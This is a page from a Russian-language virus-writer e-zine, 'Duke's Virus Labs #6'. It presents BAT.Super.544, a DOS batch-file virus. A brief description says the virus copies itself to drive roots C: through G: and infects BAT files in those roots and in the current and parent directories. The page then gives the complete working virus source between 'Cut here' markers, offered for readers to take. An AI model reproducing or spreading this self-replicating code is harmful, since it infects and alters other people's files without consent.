- [Duke's Virus Labs #6] - [Page 05] -

BAT.Super.544
(c) by Duke/SMF

Имя вируса    : BAT.Super.544
Автор         : Duke/SMF
Язык прогр.   : DOS-script
Дата создания : 07.03.99

   Этот вирус нельзя назвать малюткой. А все по причине большого количества
встроенных функций и достаточно длинного идентификатора "SuPeR".
   Это неопасный паразитический BAT-вирус. Вирус копируется в корневые
каталоги дисков c:, d:, e:, f:, g: и поражает все BAT-файлы в этих каталогах.
Также поражается текущий каталог и надкаталог. Перед поражением BAT-файлов
делается проверка на зараженность.

===== Cut here =====
@ctty nul%SuPeR%
if "%1=="SuPeR1 goto SuPeR1
if "%1=="SuPeR2 goto SuPeR2
for %%d in (c d e f g) do call %0 SuPeR1 %%d
for %%b in (*.bat ..\*.bat) do call %0 SuPeR2 %%b
goto SuPeR4
:SuPeR1
copy %0 %2:\%0%SuPeR%
if not exist %2:\%0 goto SuPeR3
for %%b in (%2:\*.bat) do call %0 SuPeR2 %%b
goto SuPeR3
:SuPeR2
if %2==AUTOEXEC.BAT goto SuPeR3
find "SuPeR"<%2
if not errorlevel 1 goto SuPeR3
find "SuPeR"<%0>c:\SuPeR.bat
type %2>>c:\SuPeR.bat
copy c:\SuPeR.bat %2
:SuPeR3
exit %SuPeR%
:SuPeR4
del c:\SuPeR.bat
ctty con%SuPeR%
: (c) by Duke/SMF
===== Cut here =====
